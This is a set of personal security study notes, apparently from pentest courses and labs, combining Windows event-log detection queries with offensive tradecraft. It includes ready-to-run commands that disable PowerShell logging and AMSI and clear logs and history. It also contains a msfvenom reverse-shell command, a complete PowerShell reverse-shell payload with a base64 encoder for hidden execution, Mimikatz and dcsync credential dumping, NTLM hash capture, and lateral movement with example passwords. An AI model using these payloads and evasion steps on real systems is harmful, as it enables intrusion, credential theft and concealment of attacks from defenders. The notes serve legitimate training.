Get hot-fix | measure
Get-NetIPAddress
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Get-WmiObject Win32_Process | 
  Select-Object Name, ProcessId, @{Name='Owner';Expression={$_.GetOwner().User}} | 
  Format-Table -AutoSize

    Process Injection (T1055)
    Process Hollowing (T1055.012)
    Process Masquerading (T1055.013)
wevtutil qe System /q:"*[System[(EventID=4624)]]" /f:text     //An account was successfully logged on.

=== ATTACKERS limit visibility========

How many total events can be used to track event tampering? 

DETECT EVENT LOG CHANGES:

1102
	Logs when the Windows Security audit log was cleared
wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text

104
	Logs when the log file was cleared
wevtutil qe System /q:"*[System[(EventID=104)]]" /f:text

1100
	Logs when the Windows Event Log service was shut down

wevtutil qe Security /q:"*[System[(EventID=1100)]]" /f:text

$logs = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"
$logs.Count
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

--------------------------------------------------

STOP logging powershell commands EV:

$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
whoami
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count

EXPOSE ATTACKERS:
4103
	Logs command invocation
wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4103)]]" /f:text

4104
	Logs script block execution
wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text | Select-String -Pattern "Creating" -Context 0,1
-------------------------

limiting the visibility of 4104 and 4103 disable Windows PowerShell script block logging:

$scriptBlockLogging = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
$scriptBlockLogging.EnableScriptBlockLogging

$moduleLogging = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue
$moduleLogging.EnableModuleLogging


$moduleLogging = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue
$moduleLogging.EnableModuleLogging

$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
$propertyName = "EnableModuleLogging"

Set-ItemProperty -Path $registryPath -Name $propertyName -Value 1
Set-ItemProperty -Path $registryPath -Name $propertyName -Value 0


$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
$valueName = "EnableScriptBlockLogging"

Set-ItemProperty -Path $registryPath -Name $valueName -Value 1
Set-ItemProperty -Path $registryPath -Name $valueName -Value 0

$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0

or use my gpo-bypass.ps1 script
or use the patchTracingFunc.exe
---------------
Hunting metasploit:
wevtutil epl System C:\path\to\Hunting_Metasploit.evtx
Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'

----------------
disable Windows PowerShell module logging.


$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false

----------------
History powershell
$historyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Test-Path $historyPath

Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

----------------------
STOP script block logging usong gpo-bypass.ps1 
clear the previous logs if there is no forward logging using
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor
--------------
 What event ID is to detect a PowerShell downgrade attack? 
400
wevtutil qe "Windows PowerShell" /q:"*[System[(EventID=400)]]" /f:text 

Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.

The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.

full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
---------------------------------------------
bypass the AMSI utility.
------------------
 What event ID logs when the log file was cleared? 
104
--------------------------
https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/580595db9f745688bc7477f6/1476761074992/Windows+Logging+Cheat+Sheet_ver_Oct_2016.pdf

Get-WinEvent -ListLog *

WEvtUtil: Use this utility to query your logs
a. WevtUtil qe Security – query the Security Log for events
    i. Lots of flags here so read help “WevtUtil -?”
    ii. /c:5 = Read 5 events
    iii. /rd:true = newest events first
    iv. /f:text = format text, also can do XML

b. Success & Failed Logons - WevtUtil qe Security /q:"*[System[(EventID=4624 or EventID=4625)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Logon_Events_Win7.log

c. User Account Change - WevtUtil qe Security /q:"*[System[(EventID=4738)]]" /c:5 /rd:true /f:text >Parsed\%computername%_User_Account_Change_Win7.log

d. New Service Installed - WevtUtil qe Security /q:"*[System[(EventID=7045)]]" /c:5 /rd:true /f:text >Parsed\%computername%_New_Service_Installed_Win7.log

e. User Account Changes - wevtutil qe Security /q:"*[System[(EventID=4725 or EventID=4722 or EventID=4723 or EventID=4724 or EventID=4726 or EventID=4767)]]" /c:10 /f:text

Spotting the Adversary with Windows Event Log Monitoring. 

https://web.archive.org/web/20190115215749/https://apps.nsa.gov/iaarchive/customcf/openAttachment.cfm?FilePath=/iad/library/ia-guidance/security-configuration/applications/assets/public/upload/Spotting-the-Adversary-with-Windows-Event-Log-Monitoring.pdf&WpKes=aF6woL7fQp3dJiqyJL2LenrLxuHC7ztGtVNK3x

Description	ID	Level	Event Log	Event Source
Firewall Rule Add	2004	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
Firewall Rule Change	2005	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
Firewall Rules Deleted	2006, 2033	Informational	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security
Firewall Failed to load Group Policy	2009	Error	Microsoft-Windows-Windows Firewall With Advanced Security	Microsoft-Windows-Windows Firewall With Advanced Security

Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Windows Firewall With Advanced Security";Id=2004} | measure | % count

Get-WinEvent -ListProvider * | Where-Object { $_.Name -match "firewall" }

------------------------------------------------------------------------------------------------------------------------
ATT&CK ID T1098 (Account Manipulation)

Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670. Especially flag events where the subject and target accounts differ[1] or that include additional flags such as changing a password with unusual systems. Especially flag events where the subject and target accounts differ[1] or that include additional flags such as changing a password with unusual systems.

Get-WinEvent -FilterHashtable @{
    ProviderName="Microsoft-Windows-Security-Auditing"
    Id=4670,4728,4738
}


------------------------------------------
Audit Process Creation

Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Security-Auditing";Id=4688} -MaxEvents 10 | Format-List -Property *|findstr /i "process command line"
Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 }
----------------------------------------------

a. WevtUtil qe Security – query the Security Log for events
   i. Lots of flags here so read help “WevtUtil -?”
   ii. /c:5 = Read 5 events
   iii. /rd:true = newest events first
   iv. /f:text = format text, also can do XML

b. Firewall Rule Added - WevtUtil qe Security /q:"*[System[(EventID=2004)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rule_Added.log

c. Firewall Rule Changed - WevtUtil qe Security /q:"*[System[(EventID=2005)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rule_Changed.log

d. Firewall Rules Deleted - WevtUtil qe Security /q:"*[System[(EventID=2006 or EventID=2033)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Rules_Deleted.log

e. Firewall Failed to Load Group Policy - wevtutil qe Security /q:"*[System[(EventID=2009)]]" /c:5 /rd:true /f:text >Parsed\%computername%_Firewall_Failed_GP.log
----------------------------------------------------------------------------------------------------------------------------------------------------
This event indicates that the system detected an executable file with invalid page hashes. This could be a sign of file corruption or potentially malicious tampering.

Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 6281 }
----------------------------------------------------------------------------------------------------
When a user account is created in Active Directory, event ID 4720 is logged.
Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4720'

Event ID 4724 is generated every time an account attempts to reset the password for another account
Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4724' -MaxEvents 1 | Format-List -Property *
--------
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)


----------------------------------
[SYSMON] - cutting down on noise. 
Applications and Services Logs/Microsoft/Windows/Sysmon/Operational

Event ID 1: Process Creation

++++++++++++++++++++++++++++++++++++++++
Event ID 3: Network Connection:

look for network connections coming from port 4444.
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'

Hunting Metasploit 

Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'

Hunting Rats and C2 Servers Common Back Connect Ports with PowerShell:

 Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Rats.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=8080'

ports to check: https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo/edit#gid=0

++++++++++++++++++++++++++++++++++++++++

Event ID 7: Image Loaded
++++++++++++++++++++++++++++++++++++++++

Event ID 8: CreateRemoteThread

Detecting Evasion Techniques
This is used in multiple evasion techniques including DLL Injection, Thread Hijacking, and Process Hollowing. 

Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath '*/System/EventID=8'


Detecting Evasion Techniques with PowerShell

++++++++++++++++++++++++++++++++++++++++

Event ID 10: CreateRemoteThread

MITRE ATTACK T1055 and S0002.

Detecting Mimikatz Abnormal LSASS Behavior MITRE ATTACK T1055 and S0002.

Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="TargetImage"] and */EventData/Data="C:\Windows\system32\lsass.exe"'

++++++++++++++++++++++++++++++++++++++++

Event ID 11: File Created

Hunting Startup Persistence

Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1023"'
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1165"'

 MITRE ATT&CK T1112.
Get-WinEvent -Path "C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1060.evtx"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1060,Runkey"'
Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1060.evtx | 
    Where-Object { $_.Message -match "RuleName:\s*T1060" }
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | 
    Where-Object { $_.Message -match "RuleName:\s*T\s*" }


Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1484"'
Get-WinEvent -Path "C:\Users\THM-Analyst\Desktop\Scenarios\Practice\T1023.evtx"  -FilterXPath '*/EventData/Data[@Name="RuleName"] and */EventData/Data="T1023"'

++++++++++++++++++++++++++++++++++++++++

Event ID 12 / 13 / 14: Registry Event
Event ID 15: FileCreateStreamHash
Event ID 22: DNS Event

+++++++++++++++++++=====
THE THREE COMMANDS I USED IN INVESTIGATION:
Sysmon.exe -accepteula -i ..\Configuration\swift.xml

Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" 

 Get-WinEvent  -LogName "Microsoft-Windows-Sysmon/Operational"   | Where-Object { $_.Message -match "\s*process create\s*" }

 Get-WinEvent  -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx  | Where-Object { $_.Message -match "\s*Network\s*" }  | Format-List -Property *

---------------------------------------------
if you don't want to login/action it means the port you wantt to access is available publically or there is no complications or it means the port is publiccally open by a server in your network it is not for example only in the localhost of the server or in a diffrent segment in the server

socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432


I'll try to sum port forwarding which has multiple types 
- local
- reverse
- dynamicc

what you need to think about port forwarding is a login and action,
for example if you know you can login with ssh then you passed the login part now you will be granted the action part whatt ever you want like 


ssh -N -R 9998 kali@192.168.118.4
------------------------------------------
By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.

------------------------------------

wscript c:\Users\thm\Desktop\payload.vbs
 cscript.exe c:\Users\thm\Desktop\payload.vbs

Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,


wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
 
=============[CHAT HEADS]======
Insecure Permissions Security Risk
Insecure Permissions Security Risk
AD Computer Naming and Policies
Extracting C Code from Image

===========[ CYBER NERD ] =========
https://unprotect.it/
interesting go by: https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5 

latest mimikatz update: https://github.com/gentilkiwi/mimikatz/releases 

got it from: https://twitter.com/gentilkiwi/status/851193274836692994 

about rdp and bmp https://www.allthingsdfir.com/do-you-even-bitmap-cache-bro/ 
=============== [ COURSES ] ========
Mastering Red Team:The Complete Cyber Security Course (2023) by Nikhil Srivastava
Beginning C++ Programming - From Beginner to Beyond by Dr. Frank Mitropoulos
Mastering Data Structures & Algorithms using C and C++ by Abdul Bari
The Complete SSL and TLS Guide: HTTP to HTTPS by Bogdan Stashchuk
The Complete Networking Fundamentals Course. Your CCNA start by David Bombal
Cisco BGP Masterclass for Enterprise Network Engineers by Neil Anderson
SSL/TLS essentials: theory and implementation by Ahmed Elfakharany
Docker Mastery: with Kubernetes +Swarm from a Docker Captain by Bret Fisher
Windows Privilege Escalation for Beginners (2020) [En] by Heath Adams
Pluralsight - Red Team Tools 
Pluralsight - Blue Team Tools
x86_64 Assembly Language and Shellcoding on Linux by Pentesters Academy
Security Manage Network Security With pfSense Firewall by Manuj Aggarwal
Ethical Hacking/Complete RED TEAM OPERATIONS in Practical by Ajay Ravichandran




=================[NOT SO SECURE ] ==============================

-------[Linux Enumeration]-----------
https://pentestmonkey.net/tools/audit/unix-privesc-check
https://github.com/rebootuser/LinEnum

-------[privesc]-----------

Linux Kernel 2.6.37 rootkit
https://www.exploit-db.com/exploits/15704

----------------------------------
offsec

arget the x86 platform and format it for C code:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
--------------------------------------------------------------------------
Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

Heuristic-Based Detection2 is a detection method that relies on various rules and algorithms to determine whether or not an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, Behavior-Based Detection3 dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, Machine-Learning Detection aims to up the game by introducing ML algorithms to detect unknown threats by collecting and analyzing additional metadata.4 For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples.5 Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.
----------------------------
While the details of the techniques Shellter uses are beyond the scope of this Module, it essentially performs a thorough analysis of the target PE file and the execution paths. It then determines where it can inject our shellcode without relying on traditional injection techniques that are easily caught by AV engines. Those include changing of PE file section permissions, creating new sections, etc.

-------------------------------
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
---------------------------------------------------------
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit

{{{{{{{{{{{{{{{{{{{{{{{{}}}}}}}}}}}}}}}}}}}}}}}}

import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

------------------------------------------------------
When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
-----------------------------------
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
----------------------------------------------------------
Powercat is a PowerShell implementation of Netcat included in Kali.

cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
----------------------------------------------
[*] file upload - enable us to get command execution via ssh authrorized_keys
[*] provided not working password - password policy so higher possibility of knowing the password using password rules


---------------------------
++++++++++++++++++++++++++++++++++
offsec outside of the scope

Although an in-depth discussion of the technical implementation of VBS and VSM is outside of the scope for this module, we should explain how this impacts us with regards to password attacks.
----------------------------- 
In more complex web applications, we may need to dig deeper into the request and response or even inspect the source code of the login form to isolate a failed login indicator, but this is outside the scope of this Module.
-----------------------------------
While the details of the techniques Shellter uses are beyond the scope of this Module, it essentially performs a thorough analysis of the target PE file and the execution paths. It then determines where it can inject our shellcode without relying on traditional injection techniques that are easily caught by AV engines. Those include changing of PE file section permissions, creating new sections, etc.
---------------------------------------
In a penetration test, we can use this payload to improve our chances of bypassing security technology and defenders. However, as Metasploit is one of the most well-known exploit frameworks, the detection rates of Meterpreter payloads are quite high by security technologies such as antivirus solutions. Therefore, we should always attempt to obtain an initial foothold with a raw TCP shell and then deploy a Meterpreter shell as soon as we have disabled or bypassed potential security technologies. However, this kind of obfuscation is outside the scope of this Module.
----------------------------------------------------------------
The second kind is to exploit vulnerabilities in the Windows Kernel.1 However, the vulnerability research and related exploit techniques are, in most cases, quite advanced and require an in-depth understanding of the Windows operating system. For the purposes of this Module, it is enough to understand that Windows kernel exploits exist and can be used for privilege escalation.
----------------------------------------------
Although BloodHound is capable of deep analysis, much of its functionality is out of scope for this Module. For now, we'll focus on the Shortest Paths shown in the Analysis tab.
-------------------------------------

+++++++++++++++++++++++++++++++++++

In more complex web applications, we may need to dig deeper into the request and response or even inspect the source code of the login form to isolate a failed login indicator, but this is outside the scope of this Module.
-------------------------------------
Instead of creating rules ourselves, we can also use rules provided by Hashcat or other sources. Hashcat includes a variety of effective rules in /usr/share/hashcat/rules:
---------------------------------------------------------
We can use various commands to extract passwords from the system. One of the most common Mimikatz commands is sekurlsa::logonpasswords, which attempts to extract plaintext passwords and password hashes from all available sources. Since this generates a huge amount of output, we'll instead use lsadump::sam, which will extract the NTLM hashes from the SAM. For this command, we must first enter token::elevate to elevate to SYSTEM user privileges.

We must have the SeDebugPrivilege access right enabled for sekurlsa::logonpasswords and lsadump::sam. We'll enable this with privilege::debug.
---------------------------------------------------------------
In some penetration tests, we may obtain code execution or a shell on a Windows system as an unprivileged user. This means that we cannot use tools like Mimikatz to extract passwords or NTLM hashes. In situations like these, we can abuse the Net-NTLMv2 network authentication protocol. This protocol is responsible for managing the authentication process for Windows clients and servers over a network.

We use "Net-NTLMv2" to refer to the formally correct NTLMv2. Since "Net-NTLMv2" is more commonly used in our industry, we use it in this course to avoid confusion.

Since we don't have privileges to run Mimikatz, we cannot extract passwords from the system. But we can set up an SMB server with Responder on our Kali machine, then connect to it with the user paul and crack the Net-NTLMv2 hash, which is used in the authentication process.
--------------------------------------------------------------------
If we've obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server. For example, we can simply run ls \\192.168.119.2\share in PowerShell (assuming our Responder is listening on that IP). If we don't have code execution, we can also use other vectors to force an authentication. 

[*] web forms (don't forget it  could be for any servie and ippsec sql) - can enable you to get a box user password, For example, when we discover a file upload form in a web application on a Windows server, we can try to enter a non-existing file with a UNC path like \\192.168.119.2\share\nonexistent.txt. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.

search using upload web form to steal share ntlmv2 or checkout https://github.com/projectdiscovery/simplehttpserver/issues/34
-------------------------------
smb relay - enable you for RCE the idea of the attack is that we know dir will give us has so instead of trying to crack the hash and it is hard we can execute command on another system that we think it has the same user with the same password
-----------------------------------------
Unlike local account hashes which are stored in the SAM, credential information such as domain hashes are stored in the memory of the lsass.exe process. Fortunately, Mimikatz can locate these stored credentials for us. Similar to our previous test-case using Mimikatz we will need to run it as Administrator (or higher) and have the SeDebugPrivilege access right enabled.
--------------------------------------------------------
/usr/bin/unix-privesc-check
----------------------------
iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
------------------------
While we received an incoming connection, we cannot execute any commands through it. This is because Netcat doesn't know how to handle a staged payload.
---------------------
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
----------------
/usr/share/metasploit-framework/scripts/resource
------------------------------------
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
------------------------
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\dave\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-------------------------
(Get-PSReadlineOption).HistorySavePath

type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Set-PSReadlineOption -HistorySaveStyle SaveNothing
----------------------------
Get-WinEvent -LogName * | Where-Object { $_.Message -like "*OS{*" } | ForEach-Object { "$($_.LogName) - $($_.TimeCreated): $($_.Message)" } | Out-File c:\users\mac\offsec-OS.txt
--------------------------------------
cp /usr/share/peass/winpeas/winPEASx64.exe .
-----------------------------------------------------

Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
--------------------------------------
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

Get-WinEvent -LogName * | Where-Object { $_.Message -like "*OS{*" } | ForEach-Object { "$($_.LogName) - $($_.TimeCreated): $($_.Message)" }
-----------------------------------------------------------------
When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
-----------------------------------------------------------------------
22.2.5. Domain Controller Synchronization

In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol1 uses replication2 to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges3 API.

Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.

If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.

To perform this attack, we'll use Mimikatz on a domain-joined Windows machine, and impacket-secretsdump5 on our non-domain joined Kali machine for the examples of this section.

Let's begin with Mimikatz and start by connecting to CLIENT75 as jeffadmin with the password BrouhahaTungPerorateBroom2023!. As jeffadmin is a member of the Domain Admins group, we already have the necessary rights assigned.

Once connected via RDP, let's open a PowerShell window and launch Mimikatz in C:\Tools. For Mimikatz to perform this attack, we can use the lsadump::dcsync module and provide the domain username for which we want to obtain credentials as an argument for /user:. For the purposes of this example, we'll target the domain user dave.
------------------------------------------------------------------
lateral movement 


wmic

C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"

or 
this is WMI on powershell

$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
-----------------------------------------
As an alternative method to WMI for remote management, WinRM can be employed for remote host management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.

For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as winrs (Windows Remote Shell).

winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"

PowerShell also has WinRM built-in capabilities called PowerShell remoting, which can be invoked via the New-PSSession cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.


PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

To interact with the session ID 1 we created, we can issue the Enter-PSSession cmdlet followed by the session ID.

Enter-PSSession 1

------------------

PsExec is a very versatile tool that is part of the SysInternals suite developed by Mark Russinovich. It's intended to replace telnet-like applications and provide remote execution of processes on other systems through an interactive console.


It is possible to misuse this tool for lateral movement, but three requisites must be met. First, the user that authenticates to the target machine needs to be part of the Administrators local group. Second, the ADMIN$ share must be available, and third, File and Printer Sharing has to be turned on. Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.
----------------------
First, it requires an SMB connection through the firewall (commonly port 445), and second, the Windows File and Printer Sharing feature to be enabled. These requirements are common in internal enterprise environments.

